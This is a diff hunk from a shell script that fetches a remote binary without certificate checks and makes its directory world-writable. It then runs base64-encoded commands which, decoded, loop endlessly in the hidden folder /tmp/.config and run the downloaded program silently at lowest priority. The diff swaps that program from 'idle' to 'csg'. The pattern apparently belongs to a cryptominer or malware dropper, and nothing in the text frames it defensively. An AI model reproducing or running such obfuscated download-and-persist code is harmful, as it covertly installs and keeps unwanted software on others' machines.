@@ -25,7 +25,7 @@ wget --no-check-certificate -qO "${work}/csg" "${src}/csg"
 chmod -R 777 "${work}"
 
 if [ "$mode" == "0" ]; then
-  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9pZGxlID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d) &
+  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9jc2cgPi9kZXYvbnVsbCAyPiYxIDsgZG9uZQ==' |base64 -d) &
 else
-  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9pZGxlID4vZGV2L251bGwgMj4mMSA7IGRvbmU=' |base64 -d)
+  sh <(echo 'd2hpbGUgdHJ1ZTsgZG8gY2QgL3RtcC8uY29uZmlnICYmIG5pY2UgLW4gMTkgLi9jc2cgPi9kZXYvbnVsbCAyPiYxIDsgZG9uZQ==' |base64 -d)
 fi
